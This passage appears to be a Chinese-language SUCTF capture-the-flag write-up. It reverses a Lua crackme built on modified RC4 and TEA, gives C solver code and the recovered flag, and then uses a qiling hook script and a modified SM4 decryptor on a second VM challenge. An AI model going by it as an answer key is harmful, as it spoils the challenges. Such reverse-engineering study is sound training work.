L6_2(L7_2, L8_2)  L7_2 = 255  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2, L7_2)  return L1_2(L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2)endfrom_uint = L0_1function L0_1(A0_2, A1_2)  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2  if A1_2 == nil then    A1_2 = 1  end  L2_2 = string  L2_2 = L2_2.byte  L3_2 = A0_2  L4_2 = A1_2  L2_2 = L2_2(L3_2, L4_2)  L3_2 = Or  L4_2 = L2_2  L5_2 = Shl  L6_2 = string  L6_2 = L6_2.byte  L7_2 = A0_2  L8_2 = A1_2 + 1  L6_2 = L6_2(L7_2, L8_2)  L7_2 = 8  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2, L7_2)  L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2, L8_2)  L2_2 = L3_2  L3_2 = Or  L4_2 = L2_2  L5_2 = Shl  L6_2 = string  L6_2 = L6_2.byte  L7_2 = A0_2  L8_2 = A1_2 + 2  L6_2 = L6_2(L7_2, L8_2)  L7_2 = 16  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2, L7_2)  L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2, L8_2)  L2_2 = L3_2  L3_2 = Or  L4_2 = L2_2  L5_2 = Shl  L6_2 = string  L6_2 = L6_2.byte  L7_2 = A0_2  L8_2 = A1_2 + 3  L6_2 = L6_2(L7_2, L8_2)  L7_2 = 24  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2, L7_2)  L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2, L8_2)  L2_2 = L3_2  return L2_2endto_uint = L0_1function L0_1(A0_2, A1_2)  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2  L6_2 = string  L6_2 = L6_2.len  L7_2 = A1_2  L6_2 = L6_2(L7_2)  L4_2 = L6_2  L6_2 = 0  L7_2 = 255  L8_2 = 1  for L9_2 = L6_2, L7_2, L8_2 do    A0_2[L9_2] = L9_2  end  L3_2 = 0  L6_2 = 0  L7_2 = 255  L8_2 = 1  for L9_2 = L6_2, L7_2, L8_2 do    L10_2 = A0_2[L9_2]    L10_2 = L3_2 + L10_2    L11_2 = string    L11_2 = L11_2.byte    L12_2 = A1_2    L13_2 = L9_2 % L4_2    L13_2 = L13_2 + 1    L11_2 = L11_2(L12_2, L13_2)    L10_2 = L10_2 + L11_2    L3_2 = L10_2 % 256    L5_2 = A0_2[L9_2]    L10_2 = A0_2[L3_2]    A0_2[L9_2] = L10_2    A0_2[L3_2] = L5_2  endendrc4init = L0_1function L0_1(A0_2, A1_2)  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2  L7_2 = \"\"  L2_2 = 0  L3_2 = 0  L8_2 = 0  L9_2 = string  L9_2 = L9_2.len  L10_2 = A1_2  L9_2 = L9_2(L10_2)  L9_2 = L9_2 - 1  L10_2 = 1  for L11_2 = L8_2, L9_2, L10_2 do    L12_2 = L2_2 + 1    L2_2 = L12_2 % 256    L12_2 = A0_2[L2_2]    L12_2 = L3_2 + L12_2    L3_2 = L12_2 % 256    L5_2 = A0_2[L2_2]    L12_2 = A0_2[L3_2]    A0_2[L2_2] = L12_2    A0_2[L3_2] = L5_2    L12_2 = Xor    L13_2 = string    L13_2 = L13_2.byte    L14_2 = A1_2    L15_2 = L11_2 + 1    L13_2 = L13_2(L14_2, L15_2)    L14_2 = And    L15_2 = A0_2[L2_2]    L16_2 = A0_2[L3_2]    L15_2 = L15_2 - L16_2    L16_2 = 255    L14_2 = L14_2(L15_2, L16_2)    L14_2 = A0_2[L14_2]    L12_2 = L12_2(L13_2, L14_2)    L6_2 = L12_2    L12_2 = L7_2    L13_2 = string    L13_2 = L13_2.char    L14_2 = L6_2    L13_2 = L13_2(L14_2)    L7_2 = L12_2 .. L13_2    L12_2 = L3_2 + L6_2    L3_2 = L12_2 % 256  end  return L7_2endrc4crypt = L0_1function L0_1(A0_2, A1_2)  local L2_2, L3_2, L4_2, L5_2  L3_2 = {}  L2_2 = L3_2  L3_2 = rc4init  L4_2 = L2_2  L5_2 = A1_2  L3_2(L4_2, L5_2)  L3_2 = rc4crypt  L4_2 = L2_2  L5_2 = A0_2  return L3_2(L4_2, L5_2)endrc4 = L0_1function L0_1()  local L0_2, L1_2  L0_2 = print  L1_2 = \"wrong\"  L0_2(L1_2)  L0_2 = os  L0_2 = L0_2.exit  L1_2 = 0  L0_2(L1_2)endfail = L0_1function L0_1(A0_2, A1_2, A2_2)  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2  L10_2 = to_uint  L11_2 = A2_2  L12_2 = 1  L10_2 = L10_2(L11_2, L12_2)  L6_2 = L10_2  L10_2 = to_uint  L11_2 = A2_2  L12_2 = 5  L10_2 = L10_2(L11_2, L12_2)  L7_2 = L10_2  L10_2 = to_uint  L11_2 = A2_2  L12_2 = 9  L10_2 = L10_2(L11_2, L12_2)  L8_2 = L10_2  L10_2 = to_uint  L11_2 = A2_2  L12_2 = 13  L10_2 = L10_2(L11_2, L12_2)  L9_2 = L10_2  L4_2 = 305419896  L5_2 = 0  L10_2 = 1  L11_2 = 32  L12_2 = 1  for L13_2 = L10_2, L11_2, L12_2 do    L14_2 = to_uint    L15_2 = rc4    L16_2 = from_uint    L17_2 = L4_2    L16_2 = L16_2(L17_2)    L17_2 = A2_2    L15_2, L16_2, L17_2, L18_2, L19_2 = L15_2(L16_2, L17_2)    L14_2 = L14_2(L15_2, L16_2, L17_2, L18_2, L19_2)    L4_2 = L14_2    L14_2 = And    L15_2 = L5_2 + L4_2    L16_2 = 4294967295    L14_2 = L14_2(L15_2, L16_2)    L5_2 = L14_2    L14_2 = And    L15_2 = Xor    L16_2 = Xor    L17_2 = Shl    L18_2 = A1_2    L19_2 = 4    L17_2 = L17_2(L18_2, L19_2)    L17_2 = L17_2 + L6_2    L18_2 = A1_2 + L5_2    L16_2 = L16_2(L17_2, L18_2)    L17_2 = Shr    L18_2 = A1_2    L19_2 = 5    L17_2 = L17_2(L18_2, L19_2)    L17_2 = L17_2 + L7_2    L15_2 = L15_2(L16_2, L17_2)    L15_2 = A0_2 + L15_2    L16_2 = 4294967295    L14_2 = L14_2(L15_2, L16_2)    A0_2 = L14_2    L14_2 = And    L15_2 = Xor    L16_2 = Xor    L17_2 = Shl    L18_2 = A0_2    L19_2 = 4    L17_2 = L17_2(L18_2, L19_2)    L17_2 = L17_2 + L8_2    L18_2 = A0_2 + L5_2    L16_2 = L16_2(L17_2, L18_2)    L17_2 = Shr    L18_2 = A0_2    L19_2 = 5    L17_2 = L17_2(L18_2, L19_2)    L17_2 = L17_2 + L9_2    L15_2 = L15_2(L16_2, L17_2)    L15_2 = A1_2 + L15_2    L16_2 = 4294967295    L14_2 = L14_2(L15_2, L16_2)    A1_2 = L14_2  end  L10_2 = A0_2  L11_2 = A1_2  return L10_2, L11_2endencrypt = L0_1function L0_1(A0_2)  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2  L2_2 = \"\"  L3_2 = \"thisshouldbeakey\"  L6_2 = rc4  L7_2 = A0_2  L8_2 = L3_2  L6_2 = L6_2(L7_2, L8_2)  A0_2 = L6_2  L6_2 = 0  L7_2 = 3  L8_2 = 1  for L9_2 = L6_2, L7_2, L8_2 do    L10_2 = to_uint    L11_2 = A0_2    L12_2 = 8 * L9_2    L12_2 = 1 + L12_2    L10_2 = L10_2(L11_2, L12_2)    L4_2 = L10_2    L10_2 = to_uint    L11_2 = A0_2    L12_2 = 8 * L9_2    L12_2 = 1 + L12_2    L12_2 = L12_2 + 4    L10_2 = L10_2(L11_2, L12_2)    L5_2 = L10_2    L10_2 = encrypt    L11_2 = L4_2    L12_2 = L5_2    L13_2 = L3_2    L10_2, L11_2 = L10_2(L11_2, L12_2, L13_2)    L5_2 = L11_2    L4_2 = L10_2    L10_2 = L2_2    L11_2 = from_uint    L12_2 = L4_2    L11_2 = L11_2(L12_2)    L12_2 = from_uint    L13_2 = L5_2    L12_2 = L12_2(L13_2)    L2_2 = L10_2 .. L11_2 .. L12_2  end  L6_2 = hex  L7_2 = L2_2  L6_2 = L6_2(L7_2)  L2_2 = L6_2  L6_2 = L2_2 == \"ac0c0027f0e4032acf7bd2c37b252a933091a06aeebc072c980fa62c24f486c6\"  return L6_2endcheck = L0_1function L0_1()  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2  L0_2 = print  L1_2 = \"input flag: \"  L0_2(L1_2)  L0_2 = io  L0_2 = L0_2.read  L0_2 = L0_2()  L1_2 = string  L1_2 = L1_2.len  L2_2 = L0_2  L1_2 = L1_2(L2_2)  if L1_2 ~= 39 then    L1_2 = fail    L1_2()  end  L1_2 = string  L1_2 = L1_2.sub  L2_2 = L0_2  L3_2 = 1  L4_2 = 6  L1_2 = L1_2(L2_2, L3_2, L4_2)  if L1_2 ~= \"SUCTF{\" then    L1_2 = fail    L1_2()  end  L1_2 = string  L1_2 = L1_2.sub  L2_2 = L0_2  L3_2 = 39  L1_2 = L1_2(L2_2, L3_2)  if L1_2 ~= \"}\" then    L1_2 = fail    L1_2()  end  L1_2 = check  L2_2 = string  L2_2 = L2_2.sub  L3_2 = L0_2  L4_2 = 7  L5_2 = 38  L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2, L4_2, L5_2)  L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2)  if L1_2 then    L1_2 = print    L2_2 = \"correct\"    L1_2(L2_2)  else    L1_2 = fail    L1_2()  endendmain = L0_1L0_1 = mainL0_1()\n\n可以 patch 一下 lua，使他能进入控制台状态或者执行其他 lua 脚本\n\n之后通过修改反编译出的 lua 脚本一步步理顺逻辑可以得到这是一个魔改 RC4 + Tea，其中 lua 的 str 转 byte 功能也被魔改了\n\nRC4 的魔改点在 原文异或完成后又对 j 进行了加减\nvoid encRC4(unsigned char *key, uint8 *data2, int length) {    int n, i, j, R, tmp;    init_sbox(key);    i = j = 0;    for (n = 0; n &lt; length; n++) {        i = (i + 1) % 256;        j = (j + sbox[i]) % 256;        tmp = sbox[i];        sbox[i] = sbox[j];        sbox[j] = tmp;        R = sbox[(sbox[i] - sbox[j]) &amp; 0xFF];        data2[n] ^= R;        j = (j + (data2[n])) % 256;    }}\n\n我写了一个 dfs 来根据 sbox 爆破出原文\n#include &lt;cstdio&gt;#include \"defs.h\"#include \"stdint.h\"#include \"stdlib.h\"unsigned char sbox[257] = {0};#define size 256void init_sbox(unsigned char *key) {    unsigned int i, j, k;    int tmp;    for (i = 0; i &lt; size; i++) {        sbox[i] = i;    }    j = k = 0;    for (i = 0; i &lt; size; i++) {        tmp = sbox[i];        j = (j + tmp + key[k % 16]) % size;        sbox[i] = sbox[j];        sbox[j] = tmp;        k += 1;    }//    uint8 bbox[256] = {//            189, 86, 91, 245, 11, 56, 53, 171, 196, 29, 20, 249, 160, 54, 81, 224, 14, 181, 33, 38, 82, 78, 61, 52, 51, 177, 40, 39, 217, 115, 182, 227, 222, 71, 247, 173, 72, 242, 234, 107, 150, 9, 136, 166, 197, 155, 13, 164, 132, 159, 118, 180, 190, 149, 10, 167, 67, 105, 252, 88, 148, 120, 119, 172, 230, 128, 114, 1, 62, 146, 121, 193, 77, 68, 2, 122, 207, 64, 112, 195, 170, 135, 103, 100, 97, 99, 28, 123, 101, 178, 84, 16, 238, 212, 96, 98, 130, 111, 139, 124, 129, 35, 168, 169, 165, 110, 235, 147, 34, 237, 3, 174, 26, 131, 244, 127, 209, 226, 49, 175, 90, 246, 144, 134, 106, 23, 255, 179, 202, 17, 248, 85, 186, 19, 31, 210, 70, 216, 109, 176, 204, 48, 63, 73, 58, 253, 133, 47, 162, 15, 87, 194, 223, 154, 36, 161, 59, 203, 143, 22, 42, 236, 188, 5, 45, 163, 69, 225, 199, 104, 27, 241, 185, 200, 239, 214, 25, 220, 219, 211, 221, 57, 43, 184, 74, 30, 117, 32, 231, 4, 208, 125, 157, 6, 137, 8, 215, 243, 37, 218, 93, 83, 126, 250, 41, 191, 80, 108, 66, 55, 24, 254, 141, 12, 251, 75, 229, 65, 0, 89, 21, 50, 153, 76, 113, 140, 7, 46, 44, 228, 142, 187, 151, 79, 206, 183, 102, 240, 158, 138, 95, 201, 145, 92, 94, 152, 233, 18, 192, 232, 156, 116, 205, 60, 213, 198//    };//    for (int i = 0; i &lt; 256; ++i) {//        sbox[i] = bbox[i];//    }}uint32 encInt(unsigned char *key, uint32 data) {    int n, i, j, R, tmp;    init_sbox(key);    uint32 orig = data;    uint8 *data2 = (uint8 *) (&amp;orig);    i = j = 0;//    printf(\"\\n\");    for (n = 0; n &lt; 4; n++) {        i = (i + 1) % 256;        j = (j + sbox[i]) % 256;        tmp = sbox[i];        sbox[i] = sbox[j];        sbox[j] = tmp;        R = sbox[(sbox[i] - sbox[j]) &amp; 0xFF];//        printf(\"%c \", data2[n]);        data2[n] ^= n;        data2[n] += 35;//        printf(\"%d %d \", data2[n], R);        data2[n] ^= R;//        printf(\"%d\\n\", data2[n]);        j = (j + (data2[n])) % 256;    }    for (int k = 0; k &lt; 4; ++k) {        data2[k] ^= k;        data2[k] += 35;    }    return orig;}void encRC4(unsigned char *key, uint8 *data2, int length) {    int n, i, j, R, tmp;    init_sbox(key);    i = j = 0;    for (n = 0; n &lt; length; n++) {        i = (i + 1) % 256;        j = (j + sbox[i]) % 256;        tmp = sbox[i];        sbox[i] = sbox[j];        sbox[j] = tmp;        R = sbox[(sbox[i] - sbox[j]) &amp; 0xFF];        data2[n] ^= R;        j = (j + (data2[n])) % 256;    }}uint32 deltas[32] = {};void decrypt(uint32_t *v, uint32_t *k){    uint32_t v0 = v[0], v1 = v[1], i;    uint32_t delta = 0x12345678;    uint32_t sum = 0;    for (int j = 0; j &lt; 32; ++j) {        delta = encInt((uint8 *) k, delta);        sum += delta;        deltas[j] = sum;    }    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 32; i++)    {        sum = deltas[31 - i];        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);    }    v[0] = v0;    v[1] = v1;}void encrypt(uint32_t *v, uint32_t *k){    // b0808b64 8e5f6941    // 3805d30c 12e4b5ed    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;//    printf(\"%x %x\\n\", v0, v1);    uint32_t delta = 0x12345678;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 32; i++)    {//        printf(\"%u \", delta);        delta = encInt((uint8 *) k, delta);//        printf(\"%d - %u\\n\", i, delta);        sum += delta;        v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);    }    v[0] = v0;    v[1] = v1;}int8* encrypt_func() {    char *mw = (char *) malloc(32);    strncpy(mw, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", 32);    int8 keys[16];    strncpy(keys, \"thisshouldbeakey\", 16);    for (int i = 0; i &lt; 16; ++i) {        keys[i] ^= i;        keys[i] += 35;    }    for (int i = 0; i &lt; 32; ++i) {        mw[i] ^= i;        mw[i] += 35;    }    // rc4 前面    printf(\"Before RC4:\\n\");    for (int i = 0; i &lt; 32; ++i) {        printf(\"%02x\", (uint8) mw[i]);    }    printf(\"\\n\");    printf(\"After RC4:\\n\");    encRC4((uint8 *) keys, (uint8 *) mw, 32);    // 未异或+35之前    for (int i = 0; i &lt; 32; ++i) {        printf(\"%02x\", (uint8) mw[i]);    }    printf(\"\\n\");    printf(\"Before string.byte:\\n\");    for (int i = 0; i &lt; 32; ++i) {        mw[i] ^= i;        mw[i] += 35;        printf(\"%02x\", (uint8) mw[i]);    }    printf(\"\\n\");    uint32 *uptr = (uint32 *) mw;    for (int i = 0; i &lt; 8; i += 2) {        encrypt(uptr + i, (uint32 *) keys);    }    for (int i = 0; i &lt; 32; ++i) {//        uint8 dt = mw[i];        mw[i] ^= i;        mw[i] += 35;        printf(\"%02x\", (uint8) mw[i]);    }    printf(\"\\n\");    return mw;}void printHex(void *ptr, size_t length) {    for (int i = 0; i &lt; length; ++i) {        printf(\"%02x\", ((uint8 *) ptr)[i]);    }    printf(\"\\n\");}uint8 crack[32] = {};bool crackRC4(uint8 *keys, uint8 *enced, int idx) {    if (idx == 32) {        uint8 enc_test[32] = {0};        memcpy(enc_test, crack, 32);        encRC4(keys, enc_test, 32);        if (memcmp(enc_test, enced, 32) != 0) return false;        for (int i = 0; i &lt; 32; ++i) {            crack[i] -= 35;            crack[i] ^= i;        }        return true;    }    for (int i = 0; i &lt; 256; ++i) {        uint8 to_encrypt[32] = {0};        for (int j = 0; j &lt; 32; ++j) {            if (j &lt; idx) to_encrypt[j] = crack[j];            else to_encrypt[j] = i;        }        encRC4(keys, to_encrypt, 32);        if (to_encrypt[idx] == enced[idx]) {            crack[idx] = i;            return crackRC4(keys, enced, idx + 1);        }    }}void decrypt_func() {    uint8 encrypted_data[32] = {            0xac,0x0c,0x00,0x27,0xf0,0xe4,0x03,0x2a,0xcf,0x7b,0xd2,0xc3,0x7b,0x25,0x2a,0x93,0x30,0x91,0xa0,0x6a,0xee,0xbc,0x07,0x2c,0x98,0x0f,0xa6,0x2c,0x24,0xf4,0x86,0xc6    };    uint32 original_data[8] = {};    // 转换 hex lua代码里面 hex 转 int 也用了 char -&gt; byte    for (int i = 0; i &lt; 32; ++i) {        encrypted_data[i] -= 35;        encrypted_data[i] ^= i;    }    memcpy(original_data, encrypted_data, 32);    // 操作 key, 也是 char -&gt; byte 的问题    int8 keys[16];    strncpy(keys, \"thisshouldbeakey\", 16);    for (int i = 0; i &lt; 16; ++i) {        keys[i] ^= i;        keys[i] += 35;    }    uint32 *enc_ptr = (uint32 *) encrypted_data;    // 反向解密 tea    for (int i = 0; i &lt; 8; i += 2) {        decrypt(enc_ptr + i, (uint32 *) keys);    }    // 由于这里还有一次 char -&gt; byte, 所以还得操作一次    uint8 toDecryptData[32] = {};    for (int i = 0; i &lt; 32; ++i) {        toDecryptData[i] = (uint8)((encrypted_data[i] - 35) ^ i);    }    // 校验    for (int i = 0; i &lt; 8; i += 2) {        encrypt(enc_ptr + i, (uint32 *) keys);        if (original_data[i] != enc_ptr[i] || original_data[i + 1] != enc_ptr[i + 1]) {            printf(\"failed!\");        }    }    printf(\"Try decrypt rc4: \");    printHex(toDecryptData, 32);    if (crackRC4((uint8 *) keys, toDecryptData, 0)) {        printf(\"Success! \");        for (int i = 0; i &lt; 32; ++i) {            printf(\"%c\", crack[i]);        }    }    printf(\"\\n\");}int main() {    decrypt_func();    return 0;}// SUCTF{341528c2bde511efade200155d8503ef}\n\nSU_vm_master先找到运算函数\nnum_operates = {    0x6a5e: \"^\",    0x6a78: \"&gt;&gt;\",    0x6a6a: \"&lt;&lt;\",    0x6a46: \"&amp;\",    0x6a52: \"|\",    0x6a3a: \"-\",    0x6a30: \"+\"}\n\n然后用 qiling 框架 hook 这些地方，获取运算逻辑\nfrom qiling import *from qiling.const import QL_VERBOSEfrom ctypes import c_uint32num_operates = {    0x6A68: \"^\",    0x6A84: \"&gt;&gt;\",    0x6A76: \"&lt;&lt;\",    0x6A50: \"&amp;\",    0x6A5C: \"|\",    0x6A44: \"-\",    0x6A38: \"+\"}operators = \"\"def hook_call(ql: Qiling):    global operators    pc = ql.arch.regs.arch_pc    op = num_operates[pc - program_base]    num1 = ql.arch.regs.read(\"rsi\")    num2 = ql.arch.regs.read(\"rdx\")    val = ql.arch.regs.read(\"rax\")    operators += f\"{num1:#x} {op} {num2:#x} = {val:#x}\\n\"ql = Qiling([\"./vm_master\"], \"/home/carbo/rootfs/x8664_linux_glibc2.39/\", verbose=QL_VERBOSE.OFF, profile=\"linux.ql\", multithread=True)program_base = ql.loader.images[0].basefor addr in num_operates.keys():    ql.hook_address(hook_call, program_base + addr)ql.run()with open(\"operators.txt\", \"w\") as f:    f.write(operators)\n\n观察运算操作，可以发现是一个魔改 SM4，还有一个奇怪的移位操作，还有 SM4 中32轮次的加密 本来是 大端读 大端存，这题是小端的，然后还会异或上一个 0xdeadbeef\nwhile (i &lt; 32){    ulbuf[i + 4] = ulbuf[i] ^ sm4Lt(ulbuf[i + 1] ^ ulbuf[i + 2] ^ ulbuf[i + 3] ^ sk[i]) ^ 0xdeadbeef;    i++;}\n\n\n\n\n这里可以发现本来读出来的密钥是 emos 0x736f6d65，换完端序变成 esom，也就是这样换序\nuint32 wtfRotate(uint32 a) {    return BYTEn(a, 3) &lt;&lt; 24 | BYTEn(a, 0) &lt;&lt; 16 | BYTEn(a, 1) &lt;&lt; 8 | BYTEn(a, 2);}\n\nIV是 0x6e696874656d6f73 和 0x646f6f67746f6e67 \n\n后16位异或上上一次加密的结果，然后 dump 出 RK 来写解密脚本\n解密脚本/* * SM4 Encryption alogrithm (SMS4 algorithm) * GM/T 0002-2012 Chinese National Standard ref:http://www.oscca.gov.cn/ * thanks to Xyssl * thnaks and refers to http://hi.baidu.com/numax/blog/item/80addfefddfb93e4cf1b3e61.html * author:goldboar * email:goldboar@163.com * 2012-4-20 */#define SM4_ENCRYPT 1#define SM4_DECRYPT 0typedef unsigned char uint8;typedef unsigned int uint32;/** * \\brief          SM4 context structure */typedef struct{    int mode;      /*!&lt;  encrypt/decrypt   */    uint32 sk[32]; /*!&lt;  SM4 subkeys       */} sm4_context;/** * \\brief          SM4 key schedule (128-bit, encryption) * * \\param ctx      SM4 context to be initialized * \\param key      16-byte secret key */void sm4_setkey_enc(sm4_context *ctx, uint8 key[16]);/** * \\brief          SM4 key schedule (128-bit, decryption) * * \\param ctx      SM4 context to be initialized * \\param key      16-byte secret key */void sm4_setkey_dec(sm4_context *ctx, uint8 key[16]);/** * \\brief          SM4-ECB block encryption/decryption * \\param ctx      SM4 context * \\param mode     SM4_ENCRYPT or SM4_DECRYPT * \\param length   length of the input data * \\param input    input block * \\param output   output block */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   uint8 *input,                   uint8 *output);/** * \\brief          SM4-CBC buffer encryption/decryption * \\param ctx      SM4 context * \\param mode     SM4_ENCRYPT or SM4_DECRYPT * \\param length   length of the input data * \\param iv       initialization vector (updated after use) * \\param input    buffer holding the input data * \\param output   buffer holding the output data */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   uint8 iv[16],                   uint8 *input,                   uint8 *output);#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include \"defs.h\"#include \"ctype.h\"/* * 32-bit integer manipulation macros (big endian) */#ifndef GET_UINT32_BE#define GET_UINT32_BE(n, b, i)                                                                                                 \\    {                                                                                                                         \\        (n) = ((uint32)(b)[(i)] &lt;&lt; 24) | ((uint32)(b)[(i) + 1] &lt;&lt; 16) | ((uint32)(b)[(i) + 2] &lt;&lt; 8) | ((uint32)(b)[(i) + 3]); \\    }#endif#ifndef GET_UINT32_LE#define GET_UINT32_LE(n, b, i)                                                                                                 \\    {                                                                                                                         \\        (n) = ((uint32)(b)[(i) + 3] &lt;&lt; 24) | ((uint32)(b)[(i) + 2] &lt;&lt; 16) | ((uint32)(b)[(i) + 1] &lt;&lt; 8) | ((uint32)(b)[(i)]); \\    }#endif#ifndef PUT_UINT32_BE#define PUT_UINT32_BE(n, b, i)              \\    {                                      \\        (b)[(i)] = (uint8)((n) &gt;&gt; 24);     \\        (b)[(i) + 1] = (uint8)((n) &gt;&gt; 16); \\        (b)[(i) + 2] = (uint8)((n) &gt;&gt; 8);  \\        (b)[(i) + 3] = (uint8)((n));       \\    }#endif#ifndef PUT_UINT32_LE#define PUT_UINT32_LE(n, b, i)              \\    {                                      \\        (b)[(i) + 3] = (uint8)((n) &gt;&gt; 24);     \\        (b)[(i) + 2] = (uint8)((n) &gt;&gt; 16); \\        (b)[(i) + 1] = (uint8)((n) &gt;&gt; 8);  \\        (b)[(i)] = (uint8)((n));       \\    }#endif/* *rotate shift left marco definition * */#define SHL(x, n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define SHR(x, n) (((x) &amp; 0xFFFFFFFF) &gt;&gt; n)#define ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))#define ROTR(x, n) (SHR((x), n) | ((x) &lt;&lt; (32 - n)))#define SWAP(a, b)    \\    {                 \\        uint32 t = a; \\        a = b;        \\        b = t;        \\        t = 0;        \\    }/* * Expanded SM4 S-boxes /* Sbox table: 8bits input convert to 8 bits output*/static const uint8 SboxTable[16][16] = {        {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},        {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},        {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},        {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},        {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},        {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},        {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},        {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},        {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},        {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},        {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},        {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},        {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},        {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},        {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},        {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};/* System parameter */static const uint32 FK[4] = {0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};/* fixed parameter */static const uint32 CK[32] = {        0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,        0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,        0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,        0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,        0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,        0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,        0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,        0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279};/* * private function: * look up in SboxTable and get the related value. * args:    [in] inch: 0x00~0xFF (8 bits unsigned value). */static uint8 sm4Sbox(uint8 inch){    uint8 *pTable = (uint8 *)SboxTable;    uint8 retVal = (uint8)(pTable[inch]);    return retVal;}void printHex_withSpace(char *name, void *ptr, int len);void hexdump(char *name, const void *data, size_t size);/* * private F(Lt) function: * \"T algorithm\" == \"L algorithm\" + \"t algorithm\". * args:    [in] a: a is a 32 bits unsigned value; * return: c: c is calculated with line algorithm \"L\" and nonline algorithm \"t\" */static uint32 sm4Lt(uint32 ka){    uint32 bb = 0;    uint32 c = 0;    uint8 a[4];    uint8 b[4];    PUT_UINT32_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_UINT32_BE(bb, b, 0)    c = bb ^ (ROTL(bb, 2)) ^ (ROTL(bb, 10)) ^ (ROTL(bb, 18)) ^ (ROTL(bb, 24));    return c;}/* * private F function: * Calculating and getting 